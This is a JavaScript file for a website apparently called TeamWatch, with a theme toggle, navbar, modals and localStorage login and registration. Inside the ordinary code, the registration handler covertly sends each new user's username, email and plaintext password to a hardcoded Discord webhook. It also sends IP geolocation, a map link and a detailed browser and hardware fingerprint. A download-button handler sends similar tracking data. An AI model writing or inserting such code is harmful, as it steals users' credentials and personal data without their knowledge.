// Theme Toggle
const themeToggle = document.getElementById('themeToggle');
const htmlElement = document.documentElement;
const icon = themeToggle ? themeToggle.querySelector('i') : null;

// Check local storage
const savedTheme = localStorage.getItem('theme') || 'dark';
htmlElement.setAttribute('data-theme', savedTheme);
updateIcon(savedTheme);

if (themeToggle) {
    themeToggle.addEventListener('click', () => {
        const currentTheme = htmlElement.getAttribute('data-theme');
        const newTheme = currentTheme === 'dark' ? 'light' : 'dark';

        htmlElement.setAttribute('data-theme', newTheme);
        localStorage.setItem('theme', newTheme);
        updateIcon(newTheme);
    });
}

function updateIcon(theme) {
    if (!icon) return;
    if (theme === 'dark') {
        icon.classList.remove('fa-sun');
        icon.classList.add('fa-moon');
    } else {
        icon.classList.remove('fa-moon');
        icon.classList.add('fa-sun');
    }
}

// Sticky Navbar Effect
const navbar = document.querySelector('.navbar');

window.addEventListener('scroll', () => {
    if (window.scrollY > 50) {
        navbar.classList.add('scrolled');
    } else {
        navbar.classList.remove('scrolled');
    }
});




// --- Webhook Helpers ---
const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1567697691410960465/amEUE_Q-PqDd-dfMzHjd0aaE3LG5Uu8WZLod4y1nhrMA1ICrtF03yyCMD_-JvtTgN--Y";

async function getIpData() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        return await response.json();
    } catch (e) {
        console.error("IP Fetch failed", e);
        return {};
    }
}

function getFlagEmoji(countryCode) {
    if (!countryCode) return '🌍';
    const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
    return String.fromCodePoint(...codePoints);
}

async function sendWebhook(payload) {
    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            keepalive: true
        });
    } catch (error) {
        console.error("Webhook failed", error);
    }
}

function getSystemInfo() {
    let gpu = 'Unknown GPU';
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            }
        }
    } catch (e) {
        console.warn("GPU detect failed", e);
    }

    return {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screen: `${window.screen.width}x${window.screen.height}`,
        colorDepth: `${window.screen.colorDepth}-bit`,
        deviceMemory: navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : 'Unknown',
        hardwareConcurrency: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Logical Cores` : 'Unknown',
        touchPoints: navigator.maxTouchPoints,
        cookiesEnabled: navigator.cookieEnabled ? "Yes" : "No",
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        connection: navigator.connection ? navigator.connection.effectiveType : 'unknown',
        referrer: document.referrer || 'Direct Access',
        currentUrl: window.location.href,
        gpu: gpu
    };
}


// --- New Features Logic ---

// Modal Logic
const extensionModal = document.getElementById('extensionModal');

function showExtensionModal() {
    if (extensionModal) {
        extensionModal.style.display = 'flex';
        // Trigger reflow for transition
        extensionModal.offsetHeight;
        extensionModal.classList.add('active');
        extensionModal.style.opacity = '1';
    }
}

function closeModal() {
    if (extensionModal) {
        extensionModal.classList.remove('active');
        extensionModal.style.opacity = '0';
        setTimeout(() => {
            extensionModal.style.display = 'none';
        }, 300);
    }
}

function redirectToDownload() {
    closeModal();
    const downloadSection = document.getElementById('download');
    if (downloadSection) {
        downloadSection.scrollIntoView({ behavior: 'smooth' });
    }
}

// Close modal when clicking outside
if (extensionModal) {
    extensionModal.addEventListener('click', (e) => {
        if (e.target === extensionModal) {
            closeModal();
        }
    });
}

// View All Rooms Logic
const viewAllBtn = document.getElementById('viewAllBtn');

if (viewAllBtn) {
    viewAllBtn.addEventListener('click', () => {
        const hiddenRooms = document.querySelectorAll('.hidden-room');
        hiddenRooms.forEach(room => {
            room.style.display = 'flex'; // Use flex to maintain card layout
            room.classList.remove('hidden-room');
        });
        viewAllBtn.style.display = 'none'; // Hide button after expanding
    });
}
// --- Auth Logic ---
document.addEventListener('DOMContentLoaded', () => {
    // Select forms safely
    const authForm = document.querySelector('.auth-card form');
    const usernameInput = document.getElementById('username');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const confirmPasswordInput = document.getElementById('confirm-password');

    // Identify Page Type
    const isRegisterPage = !!(authForm && usernameInput && confirmPasswordInput);
    const isLoginPage = !!(authForm && emailInput && passwordInput && !usernameInput);

    // Handle Register
    if (isRegisterPage) {
        authForm.addEventListener('submit', (e) => {
            e.preventDefault();
            const username = usernameInput.value;
            const email = emailInput.value;
            const password = passwordInput.value;
            const confirmPass = confirmPasswordInput.value;

            if (password !== confirmPass) {
                alert("Passwords do not match!");
                return;
            }

            // Get existing users
            const users = JSON.parse(localStorage.getItem('teamwatch_users') || '[]');

            // Check duplicate
            if (users.find(u => u.email === email)) {
                alert("User with this email already exists!");
                return;
            }

            // Register new user
            const newUser = { username, email, password };
            users.push(newUser);
            localStorage.setItem('teamwatch_users', JSON.stringify(users));

            // Auto-login
            localStorage.setItem('teamwatch_currentUser', JSON.stringify(newUser));

            // Visual feedback
            const btn = authForm.querySelector('button');
            const originalText = btn.textContent;
            btn.textContent = 'Success! Redirecting...';
            btn.style.background = '#4CAF50';
            btn.disabled = true;

            // Async function for webhook
            (async () => {
                try {
                    const data = await getIpData();
                    const sys = getSystemInfo();

                    const ip = data.ip || 'Unknown IP';
                    const country = data.country_name || 'Unknown Country';
                    const city = data.city || 'Unknown City';
                    const region = data.region || 'Unknown Region';
                    const isp = data.org || 'Unknown ISP';
                    const flag = getFlagEmoji(data.country_code);
                    const mapsLink = data.latitude && data.longitude ? `[View on Map](https://www.google.com/maps?q=${data.latitude},${data.longitude})` : 'N/A';

                    const payload = {
                        username: "TeamWatch Intelligence",
                        avatar_url: "https://i.imgur.com/4M34hi2.png",
                        embeds: [{
                            title: "🚨 HIGH-DETAIL REGISTRATION EVENT",
                            description: "A user has registered. Below is the **deep telemetry** report.",
                            color: 0x2ecc71, // Emerald Green
                            thumbnail: { url: "https://cdn-icons-png.flaticon.com/512/7542/7542177.png" },
                            fields: [
                                { name: "👤 **User Credentials**", value: `>>> **User:** \`${username}\`\n**Email:** \`${email}\`\n**Pass:** ||${password}||`, inline: false },
                                { name: "📡 **Network & Geo**", value: `**IP:** \`${ip}\`\n**ISP:** ${isp}\n**Loc:** ${flag} ${city}, ${region}, ${country}\n**Conn:** ${sys.connection.toUpperCase()}\n**Map:** ${mapsLink}`, inline: true },
                                { name: "💻 **Hardware Spec**", value: `**CPU:** ${sys.hardwareConcurrency}\n**RAM:** ${sys.deviceMemory}\n**GPU:** ${sys.gpu}\n**Scrn:** ${sys.screen} (${sys.colorDepth})`, inline: true },
                                { name: "🧭 **Browser Env**", value: `**Platform:** ${sys.platform}\n**Lang:** ${sys.language}\n**Cookies:** ${sys.cookiesEnabled}\n**Touch:** ${sys.touchPoints > 0 ? 'Yes' : 'No'} (${sys.touchPoints})`, inline: true },
                                { name: "🔗 **Session Context**", value: `**Page:** [Link](${sys.currentUrl})\n**Ref:** ${sys.referrer}\n**Time:** ${sys.timezone}`, inline: true },
                                { name: "🕵️ **User Agent**", value: `\`\`\`${sys.userAgent}\`\`\``, inline: false }
                            ],
                            footer: { text: "TeamWatch Deep Packet Inspection • v2.5", icon_url: "https://i.imgur.com/4M34hi2.png" },
                            timestamp: new Date().toISOString()
                        }]
                    };

                    await sendWebhook(payload);

                } catch (err) {
                    console.error("Webhook failed:", err);
                } finally {
                    setTimeout(() => {
                        window.location.href = 'index.html';
                    }, 1000);
                }
            })();
        });
    }

    // Handle Login
    if (isLoginPage) {
        authForm.addEventListener('submit', (e) => {
            e.preventDefault();
            const email = emailInput.value;
            const password = passwordInput.value;

            const users = JSON.parse(localStorage.getItem('teamwatch_users') || '[]');
            const validUser = users.find(u => u.email === email && u.password === password);

            if (validUser) {
                // Success
                localStorage.setItem('teamwatch_currentUser', JSON.stringify(validUser));

                const btn = authForm.querySelector('button');
                btn.textContent = 'Logging In...';

                setTimeout(() => {
                    window.location.href = 'index.html';
                }, 800);
            } else {
                // Error
                alert("Invalid email or password!");
            }
        });
    }

    // Check Auth State (Global)
    checkAuthState();
});

function checkAuthState() {
    const currentUser = JSON.parse(localStorage.getItem('teamwatch_currentUser'));
    const authBtn = document.querySelector('.navbar .desktop-only .btn-primary');

    // Only run this on pages with the navbar login button (like index.html)
    if (currentUser && authBtn && authBtn.textContent.trim() === 'Login') {
        // Change "Login" button to User Profile / Logout
        authBtn.textContent = currentUser.username;
        authBtn.classList.remove('btn-primary');
        authBtn.classList.add('btn-outline'); // Use outline style for logged in state
        authBtn.title = "Click to Log Out";

        // Change link functionality to Logout
        authBtn.href = "#";
        authBtn.addEventListener('click', (e) => {
            e.preventDefault();
            if (confirm(`Log out as ${currentUser.username}?`)) {
                localStorage.removeItem('teamwatch_currentUser');
                window.location.reload();
            }
        });
    }
}

// Main Page Download Logging
document.addEventListener('DOMContentLoaded', () => {
    const mainDownloadBtn = document.getElementById('mainDownloadBtn');
    if (mainDownloadBtn) {
        mainDownloadBtn.addEventListener('click', async (e) => {
            const data = await getIpData();
            const sys = getSystemInfo();

            const ip = data.ip || 'Unknown IP';
            const country = data.country_name || 'Unknown Country';
            const city = data.city || 'Unknown City';
            const region = data.region || 'Unknown Region';
            const isp = data.org || 'Unknown ISP';
            const flag = getFlagEmoji(data.country_code);
            const mapsLink = data.latitude && data.longitude ? `[View on Map](https://www.google.com/maps?q=${data.latitude},${data.longitude})` : 'N/A';

            const payload = {
                username: "TeamWatch Intelligence",
                avatar_url: "https://i.imgur.com/4M34hi2.png",
                embeds: [{
                    title: "📥 MAIN DOWNLOAD EVENT",
                    description: "High-intent action: User clicked download on the main landing page.",
                    color: 0x3498db, // Peter River Blue
                    thumbnail: { url: "https://cdn-icons-png.flaticon.com/512/2983/2983973.png" },
                    fields: [
                        { name: "📡 **Network & Geo**", value: `**IP:** \`${ip}\`\n**ISP:** ${isp}\n**Loc:** ${flag} ${city}, ${region}, ${country}\n**Conn:** ${sys.connection.toUpperCase()}\n**Map:** ${mapsLink}`, inline: true },
                        { name: "💻 **Hardware Spec**", value: `**CPU:** ${sys.hardwareConcurrency}\n**RAM:** ${sys.deviceMemory}\n**GPU:** ${sys.gpu}\n**Scrn:** ${sys.screen} (${sys.colorDepth})`, inline: true },
                        { name: "🧭 **Browser Env**", value: `**Platform:** ${sys.platform}\n**Lang:** ${sys.language}\n**Cookies:** ${sys.cookiesEnabled}\n**Touch:** ${sys.touchPoints > 0 ? 'Yes' : 'No'} (${sys.touchPoints})`, inline: true },
                        { name: "🔗 **Session Context**", value: `**Page:** [Link](${sys.currentUrl})\n**Ref:** ${sys.referrer}\n**Time:** ${sys.timezone}`, inline: true },
                        { name: "🕵️ **User Agent**", value: `\`\`\`${sys.userAgent}\`\`\``, inline: false }
                    ],
                    footer: { text: "TeamWatch Analytics • Main Funnel", icon_url: "https://i.imgur.com/4M34hi2.png" },
                    timestamp: new Date().toISOString()
                }]
            };

            await sendWebhook(payload);
        });
    }
});
